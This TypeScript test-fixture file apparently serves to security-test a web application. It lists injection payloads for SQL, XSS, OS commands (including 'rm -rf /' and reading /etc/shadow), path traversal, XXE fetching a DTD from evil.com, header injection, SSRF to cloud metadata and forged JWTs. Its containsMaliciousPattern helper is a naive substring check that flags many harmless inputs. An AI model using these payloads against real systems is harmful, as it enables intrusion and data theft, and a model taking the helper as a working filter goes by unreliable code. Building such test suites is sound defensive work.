/**
 * Security Test Payloads
 * Collection of malicious payloads for security testing
 *
 * IMPORTANT: These payloads are for testing only.
 * Never use in production code.
 */

/**
 * SQL Injection Payloads
 * Common SQL injection attack patterns
 */
export const SQL_INJECTION_PAYLOADS = [
  // Basic SQL injection
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  "' OR 1=1--",
  "admin'--",
  "' UNION SELECT NULL--",

  // Advanced SQL injection
  "' UNION SELECT username, password FROM users--",
  "'; EXEC xp_cmdshell('dir')--",
  "1' AND 1=(SELECT COUNT(*) FROM users); --",

  // Blind SQL injection
  "' AND SLEEP(5)--",
  "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",

  // Time-based blind injection
  "'; WAITFOR DELAY '00:00:05'--",

  // NoSQL injection (for MongoDB, etc.)
  "{ $ne: null }",
  "{ $gt: '' }",
  "admin' || '1'=='1",
];

/**
 * XSS (Cross-Site Scripting) Payloads
 * Common XSS attack patterns
 */
export const XSS_PAYLOADS = [
  // Basic XSS
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',

  // Event handler XSS
  '<body onload=alert("XSS")>',
  '<input onfocus=alert("XSS") autofocus>',
  '<select onfocus=alert("XSS") autofocus>',

  // JavaScript protocol
  'javascript:alert("XSS")',
  '<a href="javascript:alert(\'XSS\')">Click</a>',

  // Encoded XSS
  '%3Cscript%3Ealert("XSS")%3C/script%3E',
  '&#60;script&#62;alert("XSS")&#60;/script&#62;',

  // Mixed case to evade filters
  '<ScRiPt>alert("XSS")</sCrIpT>',
  '<IMG SRC=# onmouseover="alert(\'XSS\')">',

  // Data URI XSS
  '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',

  // DOM-based XSS
  '<img src=x onerror="eval(atob(\'YWxlcnQoJ1hTUycpOw==\'))">',
];

/**
 * Command Injection Payloads
 * OS command injection patterns
 */
export const COMMAND_INJECTION_PAYLOADS = [
  // Unix/Linux commands
  '; ls -la',
  '| cat /etc/passwd',
  '`whoami`',
  '$(cat /etc/passwd)',
  '& dir',

  // Windows commands
  '| dir C:\\',
  '& type C:\\Windows\\System32\\drivers\\etc\\hosts',

  // Command chaining
  '; rm -rf /',
  '&& cat /etc/shadow',
  '|| whoami',

  // Time-based detection
  '; sleep 10',
  '`ping -c 10 127.0.0.1`',
];

/**
 * Path Traversal Payloads
 * Directory traversal attack patterns
 */
export const PATH_TRAVERSAL_PAYLOADS = [
  // Basic traversal
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\sam',

  // Encoded traversal
  '..%2F..%2F..%2Fetc%2Fpasswd',
  '..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam',

  // Double encoding
  '..%252F..%252F..%252Fetc%252Fpasswd',

  // Unicode/UTF-8 encoding
  '..%c0%af..%c0%af..%c0%afetc/passwd',

  // Null byte injection
  '../../../etc/passwd%00',

  // Absolute paths
  '/etc/passwd',
  'C:\\Windows\\System32\\config\\SAM',
];

/**
 * LDAP Injection Payloads
 */
export const LDAP_INJECTION_PAYLOADS = [
  '*',
  '*)(&',
  '*)(uid=*',
  'admin)(&(password=*))',
  '*))(|(cn=*',
];

/**
 * XML/XXE Injection Payloads
 */
export const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
  '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd">%xxe;]><root/>',
];

/**
 * NoSQL Injection Payloads (MongoDB)
 */
export const NOSQL_INJECTION_PAYLOADS = [
  "{'$ne': null}",
  "{'$gt': ''}",
  "{'$where': 'sleep(1000)'}",
  "{'$regex': '.*'}",
];

/**
 * Header Injection Payloads
 */
export const HEADER_INJECTION_PAYLOADS = [
  'test\r\nX-Injected-Header: injected',
  'test\nLocation: http://evil.com',
  'test\r\nSet-Cookie: sessionid=malicious',
];

/**
 * Mass Assignment Payloads
 * Attempting to set protected fields
 */
export const MASS_ASSIGNMENT_PAYLOADS = [
  { isAdmin: true },
  { role: 'OWNER' },
  { permissions: ['*'] },
  { emailVerified: true },
  { mfaEnabled: false },
  { passwordHash: 'hacked' },
];

/**
 * JWT Manipulation Payloads
 */
export const JWT_MANIPULATION_PAYLOADS = [
  // None algorithm attack
  'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.',

  // Invalid signature
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature',

  // Expired token (example structure)
  'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiZXhwIjoxMH0.signature',
];

/**
 * File Upload Payloads
 */
export const FILE_UPLOAD_PAYLOADS = [
  // Dangerous extensions
  { filename: 'malware.exe', mimeType: 'application/x-msdownload' },
  { filename: 'shell.php', mimeType: 'application/x-php' },
  { filename: 'script.js', mimeType: 'application/javascript' },
  { filename: 'evil.sh', mimeType: 'application/x-sh' },

  // Double extensions
  { filename: 'image.jpg.php', mimeType: 'image/jpeg' },
  { filename: 'document.pdf.exe', mimeType: 'application/pdf' },

  // Null byte injection
  { filename: 'image.jpg\x00.php', mimeType: 'image/jpeg' },

  // Path traversal in filename
  { filename: '../../../etc/passwd', mimeType: 'text/plain' },

  // Oversized files
  { filename: 'huge.dat', size: 1024 * 1024 * 1024 * 10 }, // 10GB
];

/**
 * Rate Limiting Test Patterns
 */
export const RATE_LIMIT_PATTERNS = {
  // High frequency requests
  burstAttack: { requests: 100, timeWindow: 1000 }, // 100 req/sec
  sustainedAttack: { requests: 1000, timeWindow: 60000 }, // 1000 req/min

  // Distributed attack simulation
  distributedIPs: [
    '192.168.1.1',
    '192.168.1.2',
    '192.168.1.3',
    '10.0.0.1',
    '10.0.0.2',
  ],
};

/**
 * CSRF Token Manipulation
 */
export const CSRF_MANIPULATION = {
  missingToken: null,
  invalidToken: 'invalid-csrf-token-12345',
  expiredToken: 'expired-csrf-token-67890',
  reusedToken: 'reused-csrf-token-11111',
};

/**
 * Authentication Bypass Patterns
 */
export const AUTH_BYPASS_PATTERNS = [
  // Empty credentials
  { email: '', password: '' },

  // Special characters
  { email: 'admin', password: 'admin' },
  { email: 'administrator', password: 'password' },

  // Array injection
  { email: ['admin@test.com'], password: ['password'] },

  // Null/undefined injection
  { email: null, password: null },
  { email: undefined, password: undefined },
];

/**
 * Session Fixation Payloads
 */
export const SESSION_FIXATION = {
  predictableSessionId: '00000000-0000-0000-0000-000000000000',
  knownSessionId: '12345678-1234-1234-1234-123456789012',
};

/**
 * SSRF (Server-Side Request Forgery) Payloads
 */
export const SSRF_PAYLOADS = [
  // Internal network access
  'http://127.0.0.1:8080',
  'http://localhost:3306',
  'http://192.168.1.1',
  'http://169.254.169.254/latest/meta-data/', // AWS metadata

  // Protocol smuggling
  'file:///etc/passwd',
  'gopher://localhost:6379/_GET', // Redis
  'dict://localhost:11211/stats', // Memcached
];

/**
 * Buffer Overflow Patterns
 */
export const BUFFER_OVERFLOW_PATTERNS = {
  longString: 'A'.repeat(10000),
  extremelyLongString: 'A'.repeat(1000000),
  specialCharsRepeated: '\x00'.repeat(1000),
};

/**
 * Timing Attack Patterns
 */
export const TIMING_ATTACK_PATTERNS = {
  // For password comparison timing attacks
  passwords: [
    'a',
    'ab',
    'abc',
    'abcd',
    'abcde',
    'abcdef',
    'abcdefg',
    'abcdefgh',
  ],
};

/**
 * Helper function to generate random malicious payloads
 */
export function generateRandomPayload(type: 'sql' | 'xss' | 'cmd' | 'path'): string {
  const payloadMap = {
    sql: SQL_INJECTION_PAYLOADS,
    xss: XSS_PAYLOADS,
    cmd: COMMAND_INJECTION_PAYLOADS,
    path: PATH_TRAVERSAL_PAYLOADS,
  };

  const payloads = payloadMap[type];
  return payloads[Math.floor(Math.random() * payloads.length)];
}

/**
 * Helper to check if string contains any malicious patterns
 */
export function containsMaliciousPattern(input: string): boolean {
  const allPayloads = [
    ...SQL_INJECTION_PAYLOADS,
    ...XSS_PAYLOADS,
    ...COMMAND_INJECTION_PAYLOADS,
    ...PATH_TRAVERSAL_PAYLOADS,
  ];

  return allPayloads.some(payload =>
    input.includes(payload) || payload.includes(input)
  );
}
